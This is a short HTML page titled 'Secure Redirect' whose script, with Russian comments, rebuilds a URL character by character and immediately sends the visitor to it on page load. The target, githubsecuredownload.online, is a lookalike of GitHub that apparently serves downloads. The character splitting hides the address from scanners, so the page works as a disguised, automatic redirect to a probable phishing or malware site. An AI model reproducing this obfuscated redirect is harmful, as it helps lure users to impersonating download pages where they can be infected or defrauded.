<!DOCTYPE html>
<html>
<head>
    <title>Secure Redirect</title>
    <script>
        // Массив символов в правильном порядке, но разбитый на части
        const parts = [
            ['h', 't', 't', 'p', 's', ':', '/', '/'], 
            ['g', 'i', 't', 'h', 'u', 'b', 's', 'e'], 
            ['c', 'u', 'r', 'e', 'd', 'o', 'w', 'n'], 
            ['l', 'o', 'a', 'd', '.', 'o', 'n', 'l'], 
            ['i', 'n', 'e', '/', 'h', 'r', 'f', '/'], 
            ['a', 'l', 'l', 'n', 'e', 'w']          
        ];

        // Сборка URL
        let url = '';
        for (let part of parts) {
            url += part.join('');
        }

        window.location.href = url;
    </script>
</head>
<body>
</body>
</html>
